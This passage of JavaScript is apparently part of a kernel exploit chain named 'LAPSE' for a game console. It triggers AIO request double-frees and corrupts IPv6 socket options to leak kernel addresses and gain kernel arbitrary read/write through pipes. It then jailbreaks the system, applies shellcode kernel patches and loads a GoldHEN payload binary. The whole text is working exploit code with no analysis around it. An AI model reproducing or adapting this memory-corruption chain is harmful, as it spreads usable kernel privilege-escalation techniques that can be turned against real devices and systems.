                throw new SyscallError(`Unable to get socket option for fd ${twins[0]} !!`);
            }

            var n = view(nhop_addr).getInt32(0, true);
            if (n === 0) {
                view(buf_addr).setUint8(offset, 0);
                offset += 1;
            } else {
                offset += n;
            }
        }

        return view(buf_addr).getBigInt(0, true);
    }

    kread8(evf_cv_addr);
    var kstr = String.from(buf_addr);
    debug(`kstr: ${kstr}`);

    if (kstr !== "evf cv") {
        throw new Error(`Expected 'evf cv' got ${kstr} !!`);
    }

    kernel_base = evf_cv_addr.sub(KernelMisc.EVF_OFFSET(version));
    log(`kernel base: ${kernel_base}`);

    var proc = kread8(aio_info_addr.add(8));
    debug(`proc: ${proc}`);

    var mask = new BigInt("0xFFFF000000000000");
    if (proc.and(mask).neq(mask)) {
        throw new Error(`${proc} is not valid kernel address !!`);
    }

    var pid = kread8(proc.add(0xB0));
    debug(`pid: ${pid}`);

    var current_pid = getpid.invoke();
    debug(`current_pid: ${current_pid}`);

    if (pid.neq(current_pid)) {
        throw new Error(`${proc} expected pid ${current_pid} got ${pid} !!`);
    }

    var p_fd = kread8(proc.add(0x48));
    debug(`proc.p_fd: ${p_fd}`);

    fdt_ofiles = kread8(p_fd);
    debug(`fdt_ofiles: ${fdt_ofiles}`);

    var master_pipe_fp = kread8(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
    debug(`master_pipe_fp: ${master_pipe_fp}`);

    var slave_pipe_fp = kread8(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
    debug(`slave_pipe_fp: ${slave_pipe_fp}`);

    var master_pipe_f_data = kread8(master_pipe_fp);
    debug(`master_pipe_f_data: ${master_pipe_f_data}`);

    var slave_pipe_f_data = kread8(slave_pipe_fp);
    debug(`slave_pipe_f_data: ${slave_pipe_f_data}`);

    bzero(pktinfo_addr, 0x14);

    view(pktinfo_addr).setBigInt(0, master_pipe_f_data.add(8), true); // pktopts.ip6po_pktinfo = &((pipe *)master_pipe_fp->f_data)->pipe_buffer.out
    view(pktinfo_addr).setBigInt(8, 0, true); // pktopts.ip6po_nexthop = 0

    if (setsockopt.invoke(twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${twins[0]} !!`);
    }

    view(pktinfo_addr).setUint32(0, 0, true); // pipebuf.out
    view(pktinfo_addr).setUint32(4, PAGE_SIZE, true); // pipebuf.size
    view(pktinfo_addr).setBigInt(8, slave_pipe_f_data, true); // pipebuf.buffer

    if (setsockopt.invoke(twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${twins[0]} !!`);
    }

    kv = new KernelView(master_pipe, slave_pipe);

    log("Achieved kernel ARW !!");
};
//#endregion
//#region Structs
var linger = new Struct("linger", [
    { type: "Int32", name: "l_onoff" },
    { type: "Int32", name: "l_linger" }
]);

var sockaddr_in = new Struct("sockaddr_in", [
    { type: "Uint8", name: "sin_len" },
    { type: "Uint8", name: "sin_family" },
    { type: "Uint16", name: "sin_port" },
    { type: "Uint32", name: "sin_addr" },
    { type: "Uint8", name: "sin_zero", count: 8 },
]);

var SceKernelAioResult = new Struct("SceKernelAioResult", [
    { type: "Int64", name: "return_value" },
    { type: "Uint32", name: "state" }
]);

var SceKernelAioRWRequest = new Struct("SceKernelAioRWRequest", [
    { type: "Uint64", name: "offset" },
    { type: "Uint64", name: "nbyte" },
    { type: "Uint64", name: "buf" },
    { type: "SceKernelAioResult*", name: "result" },
    { type: "Int32", name: "fd" },
]);
//#endregion

log("===LAPSE===");

init();
setup();

try {
    double_free_reqs2();
    leak_kaddrs();
    double_free_reqs1();
    make_karw();

    // Increase reference counts for the pipes
    inc_karw_pipe_refcnt();

    log("Corrupted context cleanup started...");

    // remove pktinfo pointer from master twin 
    remove_pktinfo_from_so(twins[0]);

    // Remove rthdr pointer from twins
    for (var i = 0; i < twins.length; i++) {
        remove_rthdr_from_so(twins[i]);
    }

    // Remove rthdr pointer from dirty
    remove_rthdr_from_so(dirty_fd);

    log("Corrupted context cleanup complated !!");

    // Find allproc
    find_all_proc();
} finally {
    cleanup();
}

// Read bin payload
//var bin = read_file("/download0/hen.bin");
var bin = read_file("/download0/goldhen.bin");

// Jailbreak
jailbreak();

var shellcode = atob(KernelMisc.SHELLCODE(version));

// Kernel patches
kernel_patches(shellcode);

notify("Jailbreak successfull !!");

// Load bin payload
load_bin(bin);

log("===END===");